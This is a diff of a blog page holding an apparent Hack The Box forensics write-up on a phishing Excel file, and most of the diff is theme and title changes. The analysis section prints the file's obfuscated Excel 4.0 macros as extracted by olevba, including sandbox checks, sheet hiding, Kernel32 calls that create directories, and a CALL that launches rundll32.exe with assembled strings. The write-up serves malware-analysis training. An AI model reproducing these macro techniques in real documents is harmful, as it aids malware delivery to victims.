@@ -3,7 +3,7 @@
   lang="en-us"
   dir="ltr"
   class="scroll-smooth"
-  data-default-appearance="dark"
+  data-default-appearance="one-light"
   data-auto-appearance="true"><head><script src="/bubka/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=bubka/livereload" data-no-instant defer></script>
   <meta charset="utf-8">
   
@@ -15,8 +15,8 @@
 
   
   
-    <title>HTB-oBfsC4t10n2 &middot; bubka hack stuff</title>
-    <meta name="title" content="HTB-oBfsC4t10n2 &middot; bubka hack stuff">
+    <title>HTB-oBfsC4t10n2 &middot; bubka hacks stuff</title>
+    <meta name="title" content="HTB-oBfsC4t10n2 &middot; bubka hacks stuff">
   
 
   
@@ -35,7 +35,7 @@
 
   
   <meta property="og:url" content="http://localhost:1313/bubka/writeups/htb-obfsc4t10n2/">
-  <meta property="og:site_name" content="bubka hack stuff">
+  <meta property="og:site_name" content="bubka hacks stuff">
   <meta property="og:title" content="HTB-oBfsC4t10n2">
   <meta property="og:description" content="Difficulty: Hard OS: Linux Date: 2026-01-20 Description: Another Phishing document. Dig in and see if you can find what it executes.
 TL;DR # Malicious Excel 97-2003 document containing obfuscated XLM (Excel 4.0) macros. Analysis involves identifying the file format, extracting embedded macros using oletools, deobfuscating concatenated formula chains, and reconstructing the complete malicious payload to extract the flag.
@@ -104,8 +104,8 @@ Initial Analysis # I identified the file type to understand its structure. The p
   <link
     type="text/css"
     rel="stylesheet"
-    href="/bubka/css/main.bundle.min.4f40feea4c6f59a876576bf0c99d3ffd70a8847b71c25199e21b2f316a6ea95b5fce21b78684be222289fa9c04834d56e10420f50f8f476b9919b94ccc151f28.css"
-    integrity="sha512-T0D&#43;6kxvWah2V2vwyZ0//XCohHtxwlGZ4hsvMWpuqVtfziG3hoS&#43;IiKJ&#43;pwEg01W4QQg9Q&#43;PR2uZGblMzBUfKA==">
+    href="/bubka/css/main.bundle.min.c021e5819c07d4cc5a59e5328c5dd36a5597b7d868fb04bddc32d0c56e6ee89975ed188ec798a5dbff3583fba73e0d15f723602d4c97d468bc8bbc1fddbc49fb.css"
+    integrity="sha512-wCHlgZwH1MxaWeUyjF3TalWXt9ho&#43;wS93DLQxW5u6Jl17RiOx5il2/81g/unPg0V9yNgLUyX1Gi8i7wf3bxJ&#43;w==">
 
   
   
@@ -237,7 +237,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
     "keywords": ["forensics","malware-analysis","excel","xlm-macros","olevba","oleid","xlmdeobfuscator"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "844"
+    "wordCount": "848"
   }]
   </script>
 
@@ -271,6 +271,10 @@ Initial Analysis # I identified the file type to understand its structure. The p
 
 
 
+  
+    
+  
+
 
 
 
@@ -295,7 +299,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
   
   
     <a href="/bubka/" class="text-base font-medium truncate min-w-0 shrink">
-      bubka hack stuff
+      bubka hacks stuff
     </a>
   
   <div class="flex items-center ms-auto">
@@ -328,7 +332,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
       
       class="flex items-center bf-icon-color-hover"
       aria-label="about"
-      title="bubka hack stuff">
+      title="bubka hacks stuff">
       
       
         <span class="text-base font-medium break-normal">
@@ -456,7 +460,7 @@ Initial Analysis # I identified the file type to understand its structure. The p
         
         class="flex items-center gap-4 group bf-icon-color-hover text-neutral-700 dark:text-neutral-200">
         
-        <span title="bubka hack stuff" class="text-2xl font-bold tracking-tight">
+        <span title="bubka hacks stuff" class="text-2xl font-bold tracking-tight">
           about
         </span>
         
@@ -501,6 +505,89 @@ Initial Analysis # I identified the file type to understand its structure. The p
   
   <article>
     
+    
+      
+      
+      
+      
+        
+
+
+
+
+
+
+
+  
+  
+    
+  
+    
+  
+    
+  
+    
+  
+
+
+
+  
+  
+    
+    
+  
+
+
+
+
+  
+    
+    
+      
+      
+    
+  
+
+
+
+
+
+    <div id="hero" class="h-[150px] md:h-[200px]"></div>
+  
+  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
+    
+    
+    
+    <img
+      id="background-image"
+      src="/bubka/mountains1_hu_a249bad53d232748.jpg"
+      role="presentation"
+      loading="eager"
+      decoding="async"
+      fetchpriority="high"
+      class="absolute inset-0 w-full h-full object-cover"
+      >
+    <div
+      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
+    <div
+      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
+  </div>
+
+  
+    <div
+      id="background-blur"
+      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-xl bg-neutral-100/75 dark:bg-neutral-800/60"></div>
+    
+    
+    <script
+      type="text/javascript"
+      src="/bubka/js/background-blur.min.605b3b942818f0ab5a717ae446135ec46b8ee5a2ad12ae56fb90dc2a76ce30c388f9fec8bcc18db15bd47e3fa8a09d779fa12aa9c184cf614a315bc72c6c163d.js"
+      integrity="sha512-YFs7lCgY8KtacXrkRhNexGuO5aKtEq5W&#43;5DcKnbOMMOI&#43;f7IvMGNsVvUfj&#43;ooJ13n6EqqcGEz2FKMVvHLGwWPQ=="
+      data-blur-id="background-blur"
+      data-image-id="background-image"
+      data-image-url="/bubka/mountains1_hu_a249bad53d232748.jpg"></script>
+  
+      
     
 
     
@@ -884,20 +971,20 @@ Another Phishing document. Dig in and see if you can find what it executes.</p>
     
 </h2>
 <p>I identified the file type to understand its structure. The provided file is an Excel 97-2003 document</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ file oBfsC4t10n2.xls                                          
-</span></span><span style="display:flex;"><span>oBfsC4t10n2.xls: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: 0xdf, Last Saved By: 0xdf, Name of Creating Application: Microsoft Excel, Create Time/Date: Mon Mar <span style="color:#a5d6ff">23</span> 15:19:10 2020, Last Saved Time/Date: Sat Apr <span style="color:#a5d6ff">25</span> 19:43:56 2020, Security: <span style="color:#a5d6ff">0</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln">1</span><span class="cl">$ file oBfsC4t10n2.xls                                          
+</span></span><span class="line"><span class="ln">2</span><span class="cl">oBfsC4t10n2.xls: Composite Document File V2 Document, Little Endian, Os: Windows, Version 10.0, Code page: 1252, Author: 0xdf, Last Saved By: 0xdf, Name of Creating Application: Microsoft Excel, Create Time/Date: Mon Mar <span class="m">23</span> 15:19:10 2020, Last Saved Time/Date: Sat Apr <span class="m">25</span> 19:43:56 2020, Security: <span class="m">0</span></span></span></code></pre></div></div>
 <p><code>oleid</code> shows no VBA macros but confirms the presence of Excel 4.0 (XLM) macros</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ oleid oBfsC4t10n2.xls 
-</span></span><span style="display:flex;"><span>...<span style="color:#ff7b72;font-weight:bold">[</span>snip<span style="color:#ff7b72;font-weight:bold">]</span>...
-</span></span><span style="display:flex;"><span>--------------------+--------------------+----------+--------------------------
-</span></span><span style="display:flex;"><span>VBA Macros          |No                  |none      |This file does not contain
-</span></span><span style="display:flex;"><span>                    |                    |          |VBA macros.               
-</span></span><span style="display:flex;"><span>--------------------+--------------------+----------+--------------------------
-</span></span><span style="display:flex;"><span>XLM Macros          |Yes                 |Medium    |This file contains XLM    
-</span></span><span style="display:flex;"><span>                    |                    |          |macros. Use olevba to     
-</span></span><span style="display:flex;"><span>                    |                    |          |analyse them.             
-</span></span><span style="display:flex;"><span>--------------------+--------------------+----------+--------------------------
-</span></span><span style="display:flex;"><span>...<span style="color:#ff7b72;font-weight:bold">[</span>snip<span style="color:#ff7b72;font-weight:bold">]</span>...</span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl">$ oleid oBfsC4t10n2.xls 
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl">...<span class="o">[</span>snip<span class="o">]</span>...
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl">--------------------+--------------------+----------+--------------------------
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">VBA Macros          <span class="p">|</span>No                  <span class="p">|</span>none      <span class="p">|</span>This file does not contain
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl">                    <span class="p">|</span>                    <span class="p">|</span>          <span class="p">|</span>VBA macros.               
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">--------------------+--------------------+----------+--------------------------
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">XLM Macros          <span class="p">|</span>Yes                 <span class="p">|</span>Medium    <span class="p">|</span>This file contains XLM    
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">                    <span class="p">|</span>                    <span class="p">|</span>          <span class="p">|</span>macros. Use olevba to     
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">                    <span class="p">|</span>                    <span class="p">|</span>          <span class="p">|</span>analyse them.             
+</span></span><span class="line"><span class="ln">10</span><span class="cl">--------------------+--------------------+----------+--------------------------
+</span></span><span class="line"><span class="ln">11</span><span class="cl">...<span class="o">[</span>snip<span class="o">]</span>...</span></span></code></pre></div></div>
 
 <h2 class="relative group">Analysis
     <div id="analysis" class="anchor"></div>
@@ -909,61 +996,61 @@ Another Phishing document. Dig in and see if you can find what it executes.</p>
     
 </h2>
 <p>Using <code>olevba</code> to extract and analyze the XLM macros:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; Sheet,Reference,Formula,Value
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,D8,<span style="color:#a5d6ff">&#34;IF(GET.WORKSPACE(42),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,D9,GET.WORKSPACE(13),&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,D10,GOTO<span style="color:#ff7b72;font-weight:bold">(</span>C1300<span style="color:#ff7b72;font-weight:bold">)</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,H60,&#34;CONCATENATE(D187,P602,Y1087,L575)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,I180,<span style="color:#a5d6ff">&#34;CONCATENATE(E615,W1026)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,D187,&#34;CONCATENATE(K1036,D1095,Q603,B482)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,Q222,<span style="color:#a5d6ff">&#34;IF(GET.WORKSPACE(19),ON.TIME(NOW()+&#34;</span>00:00:02<span style="color:#a5d6ff">&#34;,&#34;</span>rstegerg3<span style="color:#a5d6ff">&#34;),CLOSE(TRUE))&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,O347,&#34;CONCATENATE(I1324,M11,L54,F80,Y144,X179,P383)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,K390,<span style="color:#a5d6ff">&#34;CONCATENATE(R890,G625,D1023,O870)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,U410,&#34;CONCATENATE(B781,I781)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,Y420,<span style="color:#a5d6ff">&#34;CONCATENATE(B1193,F1204,W1216)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,D450,&#34;CONCATENATE(T7,V202)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,D513,<span style="color:#a5d6ff">&#34;CONCATENATE(Y841,L955,A1038,R1149,G1239)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,N545,&#34;document.HIDE(&#34;c1zB0vasNO&#34;,TRUE)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,N546,GET.WORKSPACE<span style="color:#ff7b72;font-weight:bold">(</span>1<span style="color:#ff7b72;font-weight:bold">)</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,N547,&#34;IF(ISNUMBER(SEARCH(&#34;Windows&#34;,N546)),ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;agawf23f&#34;),CLOSE(FALSE))&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,L554,<span style="color:#a5d6ff">&#34;CONCATENATE(D999,K1225)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,L575,&#34;CONCATENATE(F1242,W428,R608)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,Q603,<span style="color:#a5d6ff">&#34;CONCATENATE(Q1159,P1236,D1332,R27,W353,D434)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,E615,&#34;CONCATENATE(D999,L1217,M1256,U1315)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,T698,<span style="color:#a5d6ff">&#34;IF(OR(D9&lt;700),ON.TIME(NOW()+&#34;</span>00:00:02<span style="color:#a5d6ff">&#34;,A1),ON.TIME(NOW()+&#34;</span>00:00:02<span style="color:#a5d6ff">&#34;,&#34;</span>Lsl23Us7a<span style="color:#a5d6ff">&#34;))&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,O752,&#34;CONCATENATE(D8,D513)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,B781,<span style="color:#a5d6ff">&#34;CONCATENATE(E1006,T1063,D874,P180)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,I781,&#34;CONCATENATE(Y222,K1085,P765,I809,C877)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,D874,<span style="color:#a5d6ff">&#34;CONCATENATE(E1164,U1191,V1285,N11,E94)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,R890,&#34;CONCATENATE(J1273,U385,T673,R75,H865)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,C953,<span style="color:#a5d6ff">&#34;CONCATENATE(B358,Q771,K834,K924,D1020,M1175,F94)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,D999,&#34;CONCATENATE(X1224,P1281,U1293,G11,Q801)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,R999,<span style="color:#a5d6ff">&#34;&#34;</span>,4.00000000000000000000
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,Q1000,CONCATENATE(U410),&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,D1023,<span style="color:#a5d6ff">&#34;IF(ISNUMBER(SEARCH(&#34;</span>6.1<span style="color:#a5d6ff">&#34;,N546)),CONCATENATE(Z699,L932,J1190,C574,J644,A718,E813),CONCATENATE(A699,E932,K1190,J574,A644,Z718,W813))&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,D1024,GOTO(R1186),&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,W1026,<span style="color:#a5d6ff">&#34;CONCATENATE(B1334,B36,H461,G1019,U1036)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,S1032,&#34;CONCATENATE(M15,T86,S187,V106,R58,P1318,C194,M440)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,S1035,<span style="color:#a5d6ff">&#34;&#34;</span>,4.00000000000000000000
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,C1040,&#34;CONCATENATE(F1213,I1285,O347,X742)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,P1047,<span style="color:#a5d6ff">&#34;CONCATENATE(H730,C801,K802,S1032,C297,B358)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,K1085,&#34;CONCATENATE(G335,Q471,W570,F615,O686,V719)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,Y1087,<span style="color:#a5d6ff">&#34;CONCATENATE(T645,M750,N1097,V551,Z960,B994)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,R1186,GET.WORKSPACE(1),&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,R1187,<span style="color:#a5d6ff">&#34;IF(NOT(ISNUMBER(SEARCH(&#34;</span>7.0<span style="color:#a5d6ff">&#34;,R1186))),CLOSE(FALSE))&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,R1188,&#34;CALL(&#34;Kernel32&#34;,&#34;CreateDirectoryA&#34;,&#34;JCJ&#34;,&#34;C:\rncwner&#34;,0)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,R1189,<span style="color:#a5d6ff">&#34;CALL(&#34;</span>Kernel32<span style="color:#a5d6ff">&#34;,&#34;</span>CreateDirectoryA<span style="color:#a5d6ff">&#34;,&#34;</span>JCJ<span style="color:#a5d6ff">&#34;,&#34;</span>C:<span style="color:#79c0ff">\r</span>ncwner<span style="color:#79c0ff">\C</span>kkYKlI<span style="color:#a5d6ff">&#34;,0)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,J1190,&#34;CONCATENATE(T1000,W1063,O1107,K1131,D517)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,R1190,<span style="color:#a5d6ff">&#34;CALL(F1220,Q1000,&#34;</span>JJCCJJ<span style="color:#a5d6ff">&#34;,0,H60,G1332,0,0)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,R1191,&#34;CALL(L554,I180,&#34;JJCCCCJ&#34;,0,&#34;Open&#34;,&#34;rundll32.exe&#34;,CONCATENATE(G1332,D8,D513,K390),0,0)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,R1192,GOTO<span style="color:#ff7b72;font-weight:bold">(</span>A1338<span style="color:#ff7b72;font-weight:bold">)</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,F1220,&#34;CONCATENATE(K1184,Y420,D450)&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,K1225,<span style="color:#a5d6ff">&#34;CONCATENATE(Q880,V1048)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,C1300,GOTO(Q222),&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,G1332,<span style="color:#a5d6ff">&#34;CONCATENATE(P1047,C593,C1040)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; c1zB0vasN,D1337,&#34;IF(F100&lt;300,ON.TIME(NOW()+&#34;00:00:02&#34;,A1),ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;KsshpqC4Mo&#34;))&#34;,&#34;&#34;
-</span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span> c1zB0vasN,A1338,<span style="color:#a5d6ff">&#34;FORMULA.FILL(&#34;</span>a<span style="color:#a5d6ff">&#34;,R~0C~0)&#34;</span>,<span style="color:#a5d6ff">&#34;&#34;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f85149">&#39;</span> c1zB0vasN,A1339,HALT<span style="color:#ff7b72;font-weight:bold">()</span>,<span style="color:#a5d6ff">&#34;&#34;</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="s1">&#39; Sheet,Reference,Formula,Value
+</span></span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,D8,<span class="s2">&#34;IF(GET.WORKSPACE(42),CONCATENATE(E394,F1194,F549,E635,O697,U208,T458,M868,Z4,U777),CONCATENATE(F394,F1194,E549,O635,U697,D777))&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="s1">&#39; c1zB0vasN,D9,GET.WORKSPACE(13),&#34;&#34;
+</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,D10,GOTO<span class="o">(</span>C1300<span class="o">)</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="s1">&#39; c1zB0vasN,H60,&#34;CONCATENATE(D187,P602,Y1087,L575)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,I180,<span class="s2">&#34;CONCATENATE(E615,W1026)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="s1">&#39; c1zB0vasN,D187,&#34;CONCATENATE(K1036,D1095,Q603,B482)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,Q222,<span class="s2">&#34;IF(GET.WORKSPACE(19),ON.TIME(NOW()+&#34;</span>00:00:02<span class="s2">&#34;,&#34;</span>rstegerg3<span class="s2">&#34;),CLOSE(TRUE))&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="s1">&#39; c1zB0vasN,O347,&#34;CONCATENATE(I1324,M11,L54,F80,Y144,X179,P383)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,K390,<span class="s2">&#34;CONCATENATE(R890,G625,D1023,O870)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="s1">&#39; c1zB0vasN,U410,&#34;CONCATENATE(B781,I781)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,Y420,<span class="s2">&#34;CONCATENATE(B1193,F1204,W1216)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="s1">&#39; c1zB0vasN,D450,&#34;CONCATENATE(T7,V202)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,D513,<span class="s2">&#34;CONCATENATE(Y841,L955,A1038,R1149,G1239)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="s1">&#39; c1zB0vasN,N545,&#34;document.HIDE(&#34;c1zB0vasNO&#34;,TRUE)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,N546,GET.WORKSPACE<span class="o">(</span>1<span class="o">)</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="s1">&#39; c1zB0vasN,N547,&#34;IF(ISNUMBER(SEARCH(&#34;Windows&#34;,N546)),ON.TIME(NOW()+&#34;00:00:02&#34;,&#34;agawf23f&#34;),CLOSE(FALSE))&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,L554,<span class="s2">&#34;CONCATENATE(D999,K1225)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="s1">&#39; c1zB0vasN,L575,&#34;CONCATENATE(F1242,W428,R608)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,Q603,<span class="s2">&#34;CONCATENATE(Q1159,P1236,D1332,R27,W353,D434)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="s1">&#39; c1zB0vasN,E615,&#34;CONCATENATE(D999,L1217,M1256,U1315)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,T698,<span class="s2">&#34;IF(OR(D9&lt;700),ON.TIME(NOW()+&#34;</span>00:00:02<span class="s2">&#34;,A1),ON.TIME(NOW()+&#34;</span>00:00:02<span class="s2">&#34;,&#34;</span>Lsl23Us7a<span class="s2">&#34;))&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="s1">&#39; c1zB0vasN,O752,&#34;CONCATENATE(D8,D513)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,B781,<span class="s2">&#34;CONCATENATE(E1006,T1063,D874,P180)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="s1">&#39; c1zB0vasN,I781,&#34;CONCATENATE(Y222,K1085,P765,I809,C877)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,D874,<span class="s2">&#34;CONCATENATE(E1164,U1191,V1285,N11,E94)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="s1">&#39; c1zB0vasN,R890,&#34;CONCATENATE(J1273,U385,T673,R75,H865)&#34;,&#34;&#34;
+</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="s1">&#39;</span> c1zB0vasN,C953,<span class="s2">&#34;CONCATENATE(B358,Q771,K834,K924,D1020,M1175,F94)&#34;</span>,<span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="s1">&#39; c1zB0vasN,D999,&#34;CONCATENATE(X1224,P1281,U1293,G11,Q801)&#34;,&#34;&#34;
